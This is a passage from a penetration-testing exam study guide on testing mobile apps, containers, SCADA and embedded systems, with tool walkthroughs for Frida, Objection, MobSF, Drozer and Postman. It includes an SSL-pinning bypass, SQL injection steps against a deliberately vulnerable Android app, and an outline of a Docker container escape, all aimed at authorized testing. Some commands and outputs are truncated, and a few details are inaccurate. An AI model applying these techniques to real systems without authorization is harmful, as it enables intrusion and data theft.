Android and Apple both have hardware security features, but Apple devices have distinct hardware-based standardizations due to the closed-source nature of the ecosystem. One of the biggest differentiators, from iOS 5 and later, is the Secure Enclave. The Secure Enclave is isolated from the main processor, and it uses a dedicated processor and memory region, secure boot ROM, and dedicated AES engine. The AES hardware engine decrypts and encrypts files as they are written or read, and keying material is not exposed to the application processor or operating system. Apple uses this to implement several security protections to prevent hardware tampering and to protect biometric authentication data and its encryption.

Start by understanding that Apple protects device-specific secrets by generating a unique ID (UID) root cryptographic key for each device, and it protects software-specific secrets with a group ID (GID) that is shared across all devices of that type. These are used to ensure that changes to sensitive hardware (such as the internal SSD storage or the touch sensor) render encrypted data inaccessible. These keys are not recoverable, even when using a JTAG or other debugging interface.

NOTE JTAG stands for Joint Test Action Group. A JTAG interface is a hardware mechanism used for debugging and connecting to embedded devices on a circuit board. JTAG is an industry standard recognized in IEEE Std 1149.1. You can read more about the standard from the IEEE digital library at https://ieeexplore.ieee.org.

Mobile Operating Systems Overview

As you might suspect, with differences in the hardware, there are differences in the OS. These differences will influence what tools you use, where you look for information, and how you evaluate security of the device. In order to understand these differences, let's dig into the iOS and Android operating systems.

iOS Operating System Security

The iOS operating system is proprietary, and iOS and its variants run exclusively on Apple mobile devices (i.e., iPhone, iPad). iOS is based on Darwin (www.puredarwin.org). Apple includes numerous security measures in the OS. For example, Apple limits available services and tools and loads the entire OS partition as read-only on disk to protect the OS contents. iOS also marks memory locations as nonexecutable through the Execute Never (XN) feature. The kernel checks applications accessing memory locations that are writeable and executable for Apple-only dynamic code-signing entitlement before being allowed.

Most system files, resources, and third-party applications are run as a nonprivileged mobile user. System applications and daemons use digitally signed entitlements to perform privileged operations. Entitlements are key-value pairs that allow authentication for applications outside of normal runtime parameters. Third-party applications gain access to user information and extensions or other features by way of declared entitlements. If a user grants an application access, that grant confers to the extensions embedded in the application, but not to extensions activated by the application.

Extensions are special signed executables packaged with the app that provide functionality to other apps. These extensions are detected and mapped for use during application install. Extensions are sandboxed—they run in a separate memory space and container from the application. Communication between extensions and the application that activated them must be handled through interprocess communications managed by the system framework. Apps and extensions from the same developer can use a shared App Group, which will allow them to share content using a shared container, preferences, and keychain items.

Additionally, iOS verifies vetted accessories via the Made for iPhone (MFI) program. When an MFI device is connected using a Lightning, USB-C connector, or Bluetooth, iOS validates it with a challenge-response protocol using an Apple-provided certificate from the accessory. A custom integrated circuit (IC) in the iDevice handles this exchange. This IC ensures that only approved accessories get full access to the device. If this authentication isn't supported, access is limited to a subset of audio controls and functionality.

Android Operating System

Android is an open-source mobile operating system based on the Linux 2.x and 3.x kernels (https://developer.android.com) developed by Google. Android runs on a variety of hardware such as mobile phones, televisions, tablets, and other technological items. Figure 7-1 describes the major components of the Android platform. On a mobile Android device, users interact within the application layer. This layer is also home for the native system apps that are installed by default such as the calendar app, camera, and e-mail. Android applications are developed in Java or Kotlin. Applications run their own processes within a virtual machine (i.e., an instance of ART, which is short for Android Runtime) as if they were separate user accounts with separate home directories. This provides isolation among all the other applications running on the device. The Java application programming interface (API) framework exposes features of the Android OS to simplify access to application data and other system components. The primary components of an Android application are

![](RackMultipart20240405-1-nwk5q_html_963c76f440f16cdf.png)

Figure 7-1 The Android platform

• Activities Parts of the application the user can see

• Fragments A behavior that is placed in an activity

• Intents Used for sending messages between other components

• Broadcast receivers Allow an application to receive notifications from other apps

• Content providers A SQLite database to store data in the form of a flat file

• Services Used to start intents, send notifications, and process data

The hardware abstraction layer (HAL) interfaces with built-in hardware components of the device. The native C and C++ libraries provide support for applications developed in native code, such as HAL and ART. The kernel provides foundational services to other components within the platform, such as drivers, memory management, and display functionality.

NOTE ART is the successor of the original runtime, the Dalvik Virtual Machine (DVM). Android versions 5.0 (API level 21) or higher no longer use DVM.

Android partitions are broken out on either the internal memory of the device or external storage. The following table describes common partitions created on most Android operating systems.

Mobile Applications Overview

For this chapter, we will focus on mobile application testing, as it is the broadest area of knowledge. The OWASP Mobile Security project is an effort to provide resources and guidance for the secure development of mobile applications. As with web applications, OWASP has provided a Mobile Top Ten Risks, as illustrated in Figure 7-2. OWASP also provides security checklists, testing guides, and other information about testing and developing secure mobile applications. Within this project, mobile applications are categorized as native, web, hybrid, or progressive web applications.

![](RackMultipart20240405-1-nwk5q_html_d81c94f5b7aa47b1.png)

Figure 7-2 OWASP Mobile Top Ten Risks (2016)

Native applications can be closely coupled with the OS and have direct access to cameras, sensors, and other device components. To create these applications, developers use SDKs that are specialized for the OS. For Android, this means using Java or Kotlin, and for iOS, this means using Objective-C or Swift. As native apps are developed with close coupling to the OS, they will only work for a single OS unless they are ported using special development tools.

Web applications, on the other hand, look like native applications, but run like a web page in the device's browser. These are often written in HTML5 and enjoy cross-platform portability. However, their functionality relies on communicating to an online back-end. As such, these can generally be tested with the same methodologies we discussed in Chapter 5.

Hybrid and progressive applications are not as simple. Hybrid apps are a combination of web and native applications. Their components use a web-to-native abstraction layer to use both web and native features. On the other hand, progressive web apps load like web pages, but allow offline use and can access limited device functions, depending on the platform. These often have local components, including storage and application configurations in the form of a Web Application Manifest.

NOTE The OWASP Mobile App Security Checklist (https://github.com/OWASP/owasp-mstg) describes common areas of concern to be evaluated during mobile pentests, while the OWASP Mobile Security Testing Guide (MSTG, https://owasp.org/www-project-mobile-security-testing-guide/) elaborates on internals of the various platforms, defines standards for security testing of mobile applications, and outlines procedures and tools to perform various testing activities against mobile devices.

Each platform implements its own application format. Applications developed for Android are stored in the Android Package Kit (APK). Since Android applications are Java-based, an APK is in a Java Archive (JAR) format and includes a manifest file (AndroidManifest.xml), which embeds the contents in a binary XML format. iOS applications are stored in the iOS App Store Package archive (IPA) format. The IPA is a ZIP-compressed archive containing all the code and resources needed to run the application. The built-in directory structure includes the Application.app, which resides inside the Payload folder and contains all the application code and resources; the application icon, stored in the iTunesArtwork folder; the iTunesMetadata.plist, which contains developer identification information, the bundle identifier, and other application identifying data; and extensions bundles, which are stored in directories named for the kit used to create them.

When applications run, they are sandboxed to prevent them from accessing data from other applications or making changes to the device. Each application has its own container, and if it needs to access device data or data from other applications, it must use services provided by the OS. In iOS, this container includes

• The Bundle container, a read-only, signed container where the app and all of its resources reside

• The Data Container, which usually includes the Documents directory (for user-created and user-accessible content); the Library directory (a top-level directory for storing any files that are not user accessible, usually including an Application Support subdirectory for files the app needs to run but should be hidden from the user); and a tmp directory (for nonpersistent files)

• An iCloud container for cloud enablement

To test an application, you will either need to install and run it, or you will need a device with it already installed to observe. As mentioned earlier, mobile applications are frequently web clients that interface with other web services and APIs. Therefore, you can use many of the techniques we discussed in Chapter 3 and Chapter 5 in the mobile space. For example, the best way to evaluate the use of communication channels is to intercept the traffic and conduct network analysis. Use OWASP ZAP or Burp Suite to inspect and manipulate web traffic, search for weak or deprecated encryption algorithms, or use Postman to evaluate API abuse. In some cases, you will need to bypass certificate pinning in order to observe the traffic. Let's dig in.

NOTE OWASP's article "Certificate and Public Key Pinning" explains what certificate pinning is and how it works within the context of mobile platforms: https://owasp.org/www-community/controls/Certificate\_and\_Public\_Key\_Pinning

Testing iOS

The OWASP Mobile Security Testing Guide recommends testing application input (including IPC, URL schemes, and user input), WebView-loaded content, back-end communication security, local data storage protection, and defense against reversing/repackaging to evaluate the security of iOS applications. To do this, you need either a copy of the application or access to a device that has the application installed.

Apple uses code signing to ensure only approved applications are run in iOS. Code can be signed by certificate validation, which requires registration and identity verification through the Apple Developer Program or the Apple Developer Enterprise Program. Verification is also done using code signature validation, which ensures all the libraries linked at launch have a valid Team ID extracted from Apple-issued certificates. The latter is a protection measure against loading third-party code by existing applications. If you have an Apple Developer account, you can sign iOS applications. Be aware, your account may be revoked if your actions are perceived as malicious, so use an account separate from your personal use account if you plan on any security research. As you might imagine from the extensive iOS security controls, testing iOS applications without jailbreaking the device is difficult.

Cydia Impactor

The Cydia Impactor tool (http://www.cydiaimpactor.com) is a GUI used to install IPA files to an iDevice. Jailbreaks, for example, are packaged as an IPA, and the Impactor tool is used to transfer the jailbreak over to the device for installation. Follow these steps to install an app to your device:

1. On your laptop, download the latest Cydia Impactor installation file for your appropriate operating system.

2. Connect the mobile device to your laptop.

3. On your laptop, open up the Cydia Impactor application. If Cydia recognizes the device, it will be displayed in the top drop-down menu box.

4. Download the app for your device and iOS version to your laptop.

5. On your laptop, open your favorite file manager GUI and drag the application file into the Cydia Impactor window. You will be asked for your Apple ID and password to continue. Enter the correct e-mail and password when prompted, then click the OK box to continue.

6. If successful, Cydia Impactor will install the IPA to the device and you will see the app on the mobile device desktop.

Cydia Package Manager

The Cydia Package Manager is the app store for "jailbroken" iDevices. Jay Freeman (saurik) is the initial creator of Cydia, which is typically installed by default after a successful jailbreak, like the ones provided from Yalu and Pangu. The Cydia home screen provides access to features including user guides, themes that can be installed to the device, repositories (repos) for useful packages, and the ability to search for a package you want to install from a repo. Figure 7-3 provides an example of what the Cydia home screen will look like. Some basic tools you may want to search for and install from the preconfigured repos are Class Dump, Wget, OpenSSH, and IPA Installer Console.

Frida for Dynamic Analysis

Frida is a modular framework designed for assessing the security of mobile apps. Frida is not only an iOS testing tool. It can also be used for Android, Windows, Linux, macOS, and QNX testing. Frida has three modes of testing: Injected mode, where you spawn into a running program or are testing a device where frida-server is running; Embedded mode, which uses a shared library (frida-gadget) embedded into your app to interact remotely; and Preloaded mode. Frida includes a number of useful tools for testing, including a code tracing engine called Stalker for tracing threads and capturing functions and instructions that are executed. But it's not a debugger. It doesn't modify code at runtime or pause execution, for example. It's also not a disassembler. Let's look at a use case.

To install Frida, you should have Python 3.x and PyPI installed on your laptop. Then run:

$ pip3 install frida-tools

Assuming that you are using macOS, you can use Frida version 12.7.12 or above (github.com/frida/frida/releases/latest) to target a USB-connected iOS 13 device. Using Cydia, go to Manage | Sources | Edit | Add, and enter https://build.frida.re to add Frida's repository. You can now enter the command frida-ps to list all installed apps.

$ frida-ps -Ua

It should prompt you to connect your device via USB. When you connect it, you should see a list of all processes running on the jailbroken device. Now you can launch the application you want to test and connect to it with Frida using frida-trace. Start by using frida-discover to look for calls to trace:

$ frida-discover -U MyApplication

Once you find an interesting API to follow, you can use frida-trace:

$ frida-trace -U MyApplication -i "TargetFunction"

The -i flag tells it to hook a C function. For Objective-C functions, you would use the -m flag. You can look at processes, trace APIs in a specific process, or inject into your application using the -l flag to specify your injected script. Frida handles this with supplied tools like frida-ps and frida-trace; however, you can write your own or use community contributed code from repos like the Frida CodeShare (codeshare.frida.re/).

NOTE To read more about Frida, including other use cases, tips on writing scripts for injection, and documentation about Frida APIs, visit their documentation trove at https://frida.re/docs/home/.

Using Objection to Bypass SSL Pinning

Applications that communicate to external server back-ends will sometimes use SSL pinning to secure the connection. If it's all encrypted and it's pinned to the server's certificate, even an on-path attack won't help you test the traffic. You can use the Objection tool (https://github.com/sensepost/objection) to bypass SSL pinning. Just like Frida, you should have Python3 and PyPI installed on your laptop and install objection using pip3:

$ pip3 install objection

You can then explore your USB-connected device by typing:

$ objection -g AppName explore

The objection command ios sslpinning disable will then attempt to bypass the SSL pinning, allowing you to inspect traffic using a tool such as Burp.

Using MobSF for Static Analysis

The Mobile Security Framework (MobSF) (https://github.com/MobSF) is an all-in-one, automated pentesting framework for mobile applications for Android, iOS, and Windows platforms. During this exercise, we will take the DVIA IPA (https://github.com/prateek147/DVIA-v2) and see what is under the hood.

NOTE You can read more about MobSF, including install instructions, requirements, and how-to's, at https://mobsf.github.io/docs/#/.

With MobSF installed and running, open your web browser and go to https://127.0.0.1:8000, which is the default navigation page. Then, click on the Upload & Analyze button and locate the IPA file for DVIA and select it to upload the file into MobSF and start the static analysis process. In the terminal window where you launched MobSF, you will notice general logging and error messages while processing the file. Once analysis is complete, you will be taken to the Static Analysis page, where you can navigate the findings from the static analysis. Figure 7-4 shows the Information and Options features for the DVIA application.

Figure 7-4 Static analysis using MobSF

Property Lists Every iOS application uses a property list (plist) file, which is typically encoded using the Unicode UTF-8 encoding and the contents are structured in XML. Figure 7-5 provides an example plist file recovered by MobSF during static analysis. A plist is used to store configuration data about the app. These files are subject to information disclosure attacks and can be modified to bypass application restrictions.

Figure 7-5 DVIA plist file

Binary Analysis MobSF evaluates the DVIA application for potential vulnerabilities using security development best practices. As we discussed earlier in the chapter, software assurance testing helps provide assurance that the software is free and clear of bugs, and binary analysis is a way to evaluate bugs in compiled software. In Figure 7-6, MobSF identified potentially insecure APIs used by DVIA. These APIs could pose an unnecessary security risk to the user.

NOTE MobSF does provide a dynamic analysis option for your Android device; however, this capability is not currently supported for iOS devices. You can find out more information from the MobSF GitHub page.

Testing Android

We talked earlier in this chapter about jailbreaking or rooting a device in order to get broader access for testing. When you have physical access to your Android device, the most reliable way to connect is using the Android Debug Bridge (ADB). Once you root the device, you can install and configure SSH and ssh to the device as "root." ADB comes with the installation of Android Studio (https://developer.android.com/studio) and has many options. To see a list of command options, execute the command adb in a terminal window by itself. Once you have the device connected to the laptop, you can list the presence of the device or emulator using the following command:

To drop into a shell, use the command syntax adb shell. If you have multiple devices and emulators connected at the same time, you can specify which one to use:

adb -s \<device name\> shell

Once you are connected to a shell, you can elevate privileges on the device if it is rooted by using the su command. Then you can navigate the file system, similar to being in a standard Linux environment. The operating system has limited commands. For instance, if you wanted to see the kernel version and release date, you couldn't use uname, as the command doesn't exist. You could, however, find that information in the /proc/sys/kernel directory and read version and osrelease, as shown in Figure 7-7.

Figure 7-7 ADB: Identify kernel version and release date in Android

APK and DIVA

You can download the source file for DIVA from https://github.com/payatu/diva-android and compile it in Android Studio. Instructions for compiling inside of Android Studio are as follows:

1. Download the source file and unzip the project file.

2. Launch Android Studio from your laptop and import the project file.

3. Install any Android Gradle missing dependencies.

4. Next, build the APK from the menu bar and select Build, then Build APK. If successful, the APK will be downloaded to the apk directory, where you unzipped the source files. For me, the location was diva-android-master\app\build\outputs\apk. The file should be named something like app-debug.apk.

5. Then we can use ADB to install the APK to the rooted device:

adb -s \<device name\> install app-debug.apk

Static Analysis

The APK Studio application is a reverse-engineering framework for disassembling and rebuilding Android applications. It provides a graphical user interface, code editor, and APK signing feature so you can modify code and repackage it if necessary. APK Studio can be downloaded from https://github.com/vaibhavpandeyvpz/apkstudio and requires the latest versions of the following software products:

• Java Development Kit (JDK)

• Apktool

• Uber-apk-signer

• adb (optional) and zipalign (linux\_x86 only)

TIP If you receive an "Unsupported major.minor version…" error in the APK Studio console window when opening an APK, the likely reason is that you are running an older version of the JRE. You should try installing a newer version of the Java SDK to correct this issue.

Once APK Studio is successfully installed and configured, follow along as we investigate "Hardcode Issues - Part 1" from the DIVA mobile application.

1. Start APK Studio and open the DIVA .apk file we built in the previous exercise using Android Studio.

2. The objective is to find hardcoded information within the source. Sometimes developers will hard-code sensitive information for ease, such as a password. CWE-798 describes the issue a little further where attackers can leverage this weakness to bypass authentication.

3. Click down through the folder structure until you find the diva folder, then click on HardcodeActivity.smali.

4. Press ctrl-f and search for "secret." You should land on a const-string value in quotes that you can plug into the equation and answer the exercise. If you are using macOS, use the command key command-f to search. This shows the hidden secret:

NOTE Smali is a type of assembler, and Smali files are created when disassembling Dalvik executables (DEX), which are included in APKs.

Drozer

Drozer is a security auditing framework for Android that can help pentesters identify vulnerabilities and validate them with exploitation. The Drozer agent is installed on the Android device, and the console is installed on your laptop. You can download the community version of Drozer from https://github.com/mwrlabs/drozer. The user guide, which provides installation instructions and examples of how to use Drozer, can be downloaded from https://labs.mwrinfosecurity.com/tools/drozer.

The following exercise will examine some of the use cases documented in the Drozer user guide. After you have successfully installed the Drozer agent and console, follow along as we use Drozer to assess the DIVA mobile application.

TIP Unfortunately, as of the time of this writing, in the latest version of Drozer the PATH detection issue is still a problem. In addition, make sure the display on the Android device stays active and that the device does not go to sleep to prevent the Drozer agent from terminating the connection prematurely.

1. Put the Java path in the .drozer\_config file in your home directory. Replace the \<jdk ver\> to match the Java install path you used for the updated JDK. For Windows it will be:

2. Start the Drozer agent on the Android device. This can be done in "infrastructure mode," where you provide a remote endpoint that can service multiple connections for exploitation, or "direct mode," where you can connect to the agent's embedded server using adb and port forwarding. For this exercise, we will connect using the direct mode. This can be accomplished by opening up the Drozer agent from the Android device and clicking the "off" button in the bottom-right corner of the app window. This will start a TCP listener on port 31415. If it's already "on," then you can skip this step.

3. Next, set up TCP forwarding to the Drozer agent from your laptop, using adb:

adb -s \<device name\> forward tcp:31415

4. Then, execute the drozer.bat command to connect to the agent from the console:

drozer.bat console connect

5. If the console connection was successful, your cursor should be blinking next to a dz\> console prompt. Use the list command to display a full list of supported commands, and use the help command\> to see arguments and help information for a specific command. To get a full list of packages installed on the device, execute the following command:

dz\> run app.package.list

TIP Android packages follow a similar naming convention as Java. The Android package name uniquely identifies the application (e.g., com.[company name].[package]). On the internal file system, these packages can be found in /data/data.

6. The package we are looking for is called jakhar.aseem.diva. Now run the package info utility, as shown next. This will extract useful information about the app such as version information, where the application stores its data (i.e., external or internal), and the application permissions, like what the app can do.

7. Next, let's look at the attack surface for the application to see what is exposed to other applications on the device. The following illustration shows the Drozer command for identifying the attack service. Android applications operate in a sandbox, like iOS applications. However, vulnerabilities exposed through the Android built-in interprocess communication (IPC) mechanisms could leak sensitive data and be at risk of compromise. The IPC mechanisms in Android include intents, binders, and broadcast receivers, which we discussed earlier in the chapter. The output shows one content provider, which we can investigate further to find out how it is organized to see if we can extract any information from it.

8. Next we can run scanner.provider.finduris to find out the content uniform resource identifiers (URIs) we can query. Then we can try and query the content using app.provider.query with the --vertical flag, which displays the results up and down. Some content providers may share information over external storage, which could provide a means to access data outside the Android sandbox environment. The following illustration provides the command syntax and results from executing the scanner and provider query.

9. Android applications use SQLite databases for storing data, which can be queried using typical SQL query commands. SQLite databases (.db) are flat files stored on the file system. Content providers can be susceptible to SQL injections just like any other database. The app.provider.query command can be used to evaluate the SQL statement used to query the database. The --projection or --selection command option can be used to test for SQL injection in either the "projection" or "selection" fields in the query. The first command, shown in the following illustration, produces an error when injecting a "'" into the projection field used to select data from the notes table. The second command exploits the injection vulnerability to retrieve the SQLITE\_MASTER table, which discloses all tables from the database. Now you can alter the SELECT statement to retrieve data from other tables in the database. If this app stored e-mail addresses, passwords, or other sensitive information in another table of the database, that data could be susceptible to compromise.

10. Drozer also includes a command to scan for injection vulnerabilities in content providers called scanner.provider.injection. The vulnerable content provider we just exploited in the previous step is shown here.

Capturing API Requests with Postman

Postman (https://www.postman.com/) is a free tool for building and interacting with APIs. The tool simplifies many of the tasks necessary to intercept, manipulate, and send API requests that mobile applications may generate during the mobile app testing process. You will need to create an account to use Postman. Similarly to Burp Suite, Postman is used as an interception proxy and can work independently or with Burp Suite to enumerate and attack API endpoints.

EXAM TIP For exam questions, read about Postman's features and become more familiar with its interface by reading the tutorials on the Postman website: https://learning.postman.com/docs/getting-started/introduction/

First, let's intercept requests from a mobile device.

1. Connect your mobile device and your laptop or other testing platform to the same wireless network.

2. In Postman, open a workspace, then click on the Proxy Settings button in the top menu bar.

3. In the pop-up, you can supply a proxy port, or use the default port and choose the destination for saving your requests and responses. The default is port 5555 and saving requests only to History. You can also opt to exclude requests with images or CSS and apply URL-specific filters if you like.

4. Set up the device to use your laptop IP and port 5555 as the proxy. This is usually under the wireless settings under the Modify Networks option.

5. Now, when you open a browser on the mobile device or execute a mobile web application, you should see calls populate inside Postman.

Postman has several components, including request collections, a script runner, scriptable variables, Environments for context, pre-requests, and tests. Collections allow you to group similar API requests. When you run a collection, with Runner, you essentially send all of those requests in series. You can use this with variables for fuzzing GET or POST parameters in an API, for example. Additionally, Runner lets you build scripted test suites and workflows and send data between API requests. Variables in Postman are similar to variables in programming, which we will discuss more in Chapter 11. You can reference variables in the body, URL, or headers of a request. Environments are key-value pairs that let you associate variables with a specific context (e.g., a specific user) in your test. You can use pre-request scripts to test API responses or set up variables or other test data. Once you receive an API response, Postman runs tests. Test scripts can parse response components and return boolean results. Therefore, Postman runs pre-request scripts, sends a request, gets a response, and then runs tests.

NOTE More documentation about built-in modules for JavaScript in Postman can be found at https://www.getpostman.com/docs/v6/postman/scripts/postman\_sandbox\_api\_reference.

To build an API request from scratch (https://learning.postman.com/docs/getting-started/sending-the-first-request/), you need to specify an endpoint (the request URL), authorization details (Basic, OAuth, etc.), and any headers or body details that are required. Body details can be form data, raw data, binary data, or form-url-encoded data. Postman shows the response to an API request in the bottom of the app, as in Figure 7-8. You can also take an API request you have captured and run it with manipulations instead. Simply click on the observed request to load it on the right-hand side, manipulate it before running it, and go.

Figure 7-8 Postman response

Virtual and Containerized Systems

Testing of virtual and containerized systems often evaluates the ability of a tester to break out of a container or guest system. In these cases, tests are limited by what is available within the container or guest, rather than what is available in the hypervisor or host. This may involve a reduced set of functionality with additional restrictions on operation. In other cases, testers may seek insecure stored credentials in setup or deployment scripts for those containers.

NOTE Microsoft maintains documentation about the difference between virtual machines and containers that will help contextualize the differences in pentesting approach: https://docs.microsoft.com/en-us/virtualization/windowscontainers/about/containers-vs-vm. Also of note is Mike Coleman's blog post "Containers are not VMs" on the Docker blog: https://www.docker.com/blog/containers-are-not-vms/

Hyper-V, vSphere, ESXi, and Citrix are all names you might hear in association with virtualized solutions. Virtualization solutions run a hypervisor—or virtual machine monitor (VMM)—which can run in a parent OS or on the hardware itself. The hypervisor handles hardware virtualization and resource management for each guest machine it hosts. Breaking out of a guest system and gaining access to the hypervisor (or its parent OS) may enable control over other systems being virtualized, depending on how host isolation is implemented and bypassed.

In the container world, you will hear names like Docker and Kubernetes (or K8). These run within an operating system and provide abstraction at the software level, rather than simulating or emulating hardware component interactions. In these cases, looking for unsecured tokens or other sensitive information in container setup scripts, finding ways to break out of the container (container escape), and finding ways to abuse software abstraction to affect other containers may be targeted.

In both cases, this requires that the tester gain privileged access within the virtualized system or container, and then find an exploit that allows escape from that container or guest to the hosting OS, and then gain elevated privileges within the parent or hosting OS in order to gain control over additional running virtual systems or containers. If the container or virtualized guest is run with elevated privileges on the parent or base OS, escape from the isolated environment will result in significantly more compromise. This run as root scenario is very common in Docker environments especially. Docker implements this with the --privileged flag, e.g., docker run --rm -it --privileged ubuntu bash.

Docker uses Linux cgroups (https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt) as one of its methods of container isolation. In cgroups version 1, the notify\_on\_release feature executed the release\_agent file with root privileges. This is designed to clean up abandoned cgroups, but can be abused for container escape. This is one of many examples of container abuse. You can read a full writeup from Trail of Bits here: https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/

NOTE There are several good blog posts about attacking Kubernetes and Docker environments, including this one, "Hacking Containers Like A Boss" from Practical DevSecOps: https://www.practical-devsecops.com/lesson-4-hacking-containers-like-a-boss/ and the "Kubernetes Pentest Methodology" series from CyberArk: https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1

Other Nontraditional Systems

Pentesters may be called upon to evaluate the security of consumer devices (this is also referred to as Internet of Things, or IoT), such as smart home automation; smart devices; or specialized systems that are only used in industrial, health care, or other commercial settings. Some of these devices may be tested in the same way as mobile devices or other wireless devices, as discussed in Chapter 4. Network and wireless replay attacks, (in)secure channel testing, abuse of default or hardcoded credentials, and known weaknesses in firmware are all possible avenues of attack.

A good example of commercial systems that fall into this category are management systems that use the Intelligent Platform Management Interface (IPMI) protocol. These systems are high-value targets, because these embedded controller systems may have direct control over the hardware of their host systems. A successful compromise of a baseboard management controller (BMC), for example, will allow a tester to reboot, reinstall, or even monitor traffic from the host system with no visibility to the OS being observed. An Nmap scan may show these devices with Dropbear sshd on TCP port 22, lighthttpd on TCP ports 443 and 80, and TCP and UDP on port 623 (IPMI RMCP) enabled. Being able to recognize these devices and identify exploits to gain access to them may be important if you encounter these devices.

NOTE You may want to familiarize yourself further with IPMI exploitation so that you can recognize it on the exam. Rapid 7 has a good writeup on their blog: https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/

Other specialized systems can only be attacked through hardware reverse engineering or custom attack methodologies. Two types of systems that bear special consideration as it pertains to attack methodology are SCADA and ICS systems and embedded systems using real-time operating systems (RTOSs). We'll break these down a bit further next.

SCADA and Industrial Control Systems

Industrial control systems (ICSs) are systems that relate to industry automation of all types, including manufacturing, power generation (power plants), water treatment, and distribution systems. Supervisory control and data acquisition (SCADA) systems pull data from ICS systems, coordinate transferring that data to a central place, and present it in a human-usable format so that components of the ICS can subsequently be controlled. A significant benefit of SCADA networks is alarm handling. Sensors deployed through the network will monitor conditions to ensure proper functionality. If the sensor indicates a change in normal operation, it can fire off an indicator and generate an alert in the system, and a human operator can manage the response. As shown in Figure 7-9, a SCADA system can be made up of multiple components, including:

![](RackMultipart20240405-1-nwk5q_html_dd5a3726d96532ec.png)

Figure 7-9 System concept of SCADA

• Supervisory workstation A computer or console, which is the core of the system that gathers data and sends commands to connected devices, such as RTUs and PLCs.

• Remote terminal unit (RTU) Strategically placed on the network, close to the process being managed, and converts sensor signals and relays digital data back to the supervisory system.

• Programmable logic controller (PLC) Similar to RTUs, but with more sophisticated logic and configuration capabilities.

• Communication infrastructure Connects devices and facilitates communications using popular SCADA protocols such as DNP3 (UDP based) and ModBus (TCP based).

• Human-machine interface (HMI) Operator application (typically a graphical user interface) installed on the supervisory system that is used to monitor and manage the supervisory control system.

Unfortunately, SCADA systems are not typically developed with security in mind and may be fragile as a result of their specialized implementation. SCADA networks typically operate under the "if it ain't broke don't fix it" mentality and are not patched nearly as often as corporate networks. These environments are often very expensive to retrofit, and some are required to follow stringent certification requirements for even the most minor change due to the potential for damage should unauthorized changes result in system failure. Therefore, many ICS and SCADA owners will require preapproval of tools to be used during a pentest and may have extensive limitations on writing files, installing tools, or even conducting network discovery on these networks. For some, even a single TCP or UDP port scan against a single component can cause catastrophic failure.

A report detailing the results of a survey conducted by the Idaho National Laboratory (INL) (www.inl.gov) and sponsored by the USDOE Office of Nuclear Energy, called "A Survey of Security Tools for the Industrial Control System Environment," identifies existing tools that should be considered when investigating and testing for security weaknesses in an ICS environment. The report can be found on the U.S. Department of Energy Office of Scientific and Technical Information website at https://www.osti.gov. SCADA networks should typically be isolated from the corporate domain. They can fall victim to the same threats and attack vectors that affect typical IT systems. NIST Special Publication 800-82, "Guide to Industrial Control Systems (ICS) Security" (https://csrc.nist.gov), provides common weaknesses and vulnerabilities found in SCADA and ICS systems and how to apply necessary safeguards to the environment.

TIP There is an Nmap NSE script that enumerates SCADA modules and collects device and vendor information available, called modbus-discover. ModBus typically operates on port 502/tcp.

As a result of the mind-set that these systems are better isolated than retrofitted, there are a few common weaknesses you should expect to see among ICS systems. In a traditional pentest cleartext protocols may not be desirable. In some of these environments, they may be unavoidable. Modbus, for example, is a cleartext protocol that is vulnerable to interception and replay. However, the costs and realities of trying to fix something like this are unrealizable for some of these environment owners. High-performance requirements may provide another reason these systems should be segmented from other networks. Other devices may have known weaknesses but are mission critical and have no viable replacement option. Manufacturers sometimes go out of business, and the specialized niche has not been taken up by other manufacturers. The same is true of legacy applications. In some cases, there are no other solutions that will run on the specialized operating systems in place, and there are simply no fixes available for the current solution. Hardcoded passwords, which cannot be changed by systems owners, may even be in use, or default passwords used by installers have not been changed. Password lists for these devices circulate freely online.

Pentests may need to focus on evaluating network segmentation and device isolation in the context of other devices in order to protect networks on which industrial Internet of Things (IIoT) or ICS and SCADA devices run. Remember that traditional risk concerns may not be as applicable to these environments as safety to personnel or the environment, impacts to the process, or regulations.

Embedded Systems

Embedded systems are made up of a combination of computer hardware and software designed and programmed for a specific purpose. Microcontrollers and microprocessors are embedded systems built with processors and memory and are commonly found in home appliances and smart home automation, as well as health care devices, point-of-sale systems, vehicles, and multifunctional devices (printers and scanners). Some embedded systems provide a user interface that closely resembles modern-day operating systems, called a real-time operating system (RTOS), which is a stripped-down version of commonly deployed operating systems, such as Linux and Microsoft Windows.

An RTOS is required to adhere to deadlines associated with tasks, regardless of what happens in the system. Some common RTOSs are LynxOS, OSE, QNX, Real Time (RT) Linux, VxWorks, and Windows CE (WinCE). There are three classifications of RTOSs: hard, firm, and soft. A hard RTOS must strictly adhere to time constraints for the associated task. Availability and time to react are extremely important in the design of these systems. In a medical application, such as a pacemaker, the device stimulates the heart muscle at just the right time. If the task is completed too late or too soon, the patient's life could be at risk. Firm and soft RTOSs are still time sensitive; however, they offer some flexibility, as missing a deadline may cause undesirable effects but nothing catastrophic. Since most of the RTOSs are built from recycled code or existing operating systems, they are not exempt from known vulnerabilities.

RTOSs are difficult to patch and are typically in the form of a firmware update or upgrade and are not released as often by many vendors. Some of these systems run web-based applications and are configured with default credentials (i.e., admin/admin, admin/password), which make them easy targets for attacks. A pentester's approach to assessing these devices over the network would be similar to the approach taken against a corporate IT system. The Nmap fingerprint database contains thousands of entries, which includes IoT network services and operating systems. IoT and embedded devices have been around for a while now and are growing in popularity each year. The Internet of Things Security Companion to the CIS Critical Security Controls, published by the Center for Internet Security, provides best practices for protecting embedded operating systems from common types of attacks.

Chapter Review

In this chapter, we've examined mobile pentesting and pentesting of specialized and fragile systems at a high level. There should be enough information in this chapter to enable you to recognize questions about these devices, address some of the basic considerations about attack types and special considerations, and think about common weaknesses and vulnerabilities that apply to these devices. However, this is a very broad area of expertise, and you should do additional research into the topics by using the resources provided to help prepare yourself for the exam. Familiarize yourself with some of the tools in the exercises we have provided, and take time with their interfaces and outputs so that you can identify them and manipulate them if asked during the exam.

## Chapter 8: Social Engineering and Physical Attacks

In this chapter, you will learn about

• Social engineering methods of influence, pretexting, and impersonation

• The basics of social engineering attacks using various media types and tools

• Gaining an understanding of basic physical security attacks

